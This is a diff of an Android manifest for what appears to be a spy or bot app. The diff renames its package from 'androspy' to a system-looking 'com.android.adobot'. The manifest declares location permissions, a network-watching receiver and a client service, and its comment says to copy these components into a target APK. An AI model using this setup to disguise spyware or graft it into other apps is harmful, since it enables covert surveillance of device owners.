@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="buddy.ap.com.androspy">
+    package="com.android.adobot">
 
     <uses-permission
         android:name="android.permission.ACCESS_FINE_LOCATION"
@@ -36,17 +36,13 @@
         android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:required="true" />
 
-    <meta-data
-        android:name="com.google.android.gms.version"
-        android:value="@integer/google_play_services_version" />
-
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name="buddy.ap.com.androspy.MainActivity">
+        <activity android:name="com.android.adobot.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -54,15 +50,15 @@
         </activity>
 
         <!--copy the receivers and services to the target apk source-->
-        <activity android:name="buddy.ap.com.androspy.UpdateActivity"></activity>
+        <activity android:name="com.android.adobot.UpdateActivity"></activity>
 
-        <receiver android:name="buddy.ap.com.androspy.NetworkWatcher">
+        <receiver android:name="com.android.adobot.NetworkWatcher">
             <intent-filter>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
             </intent-filter>
         </receiver>
 
-        <service android:name="buddy.ap.com.androspy.Client" />
+        <service android:name="com.android.adobot.Client" />
 
         <!--end of services and receivers-->
 
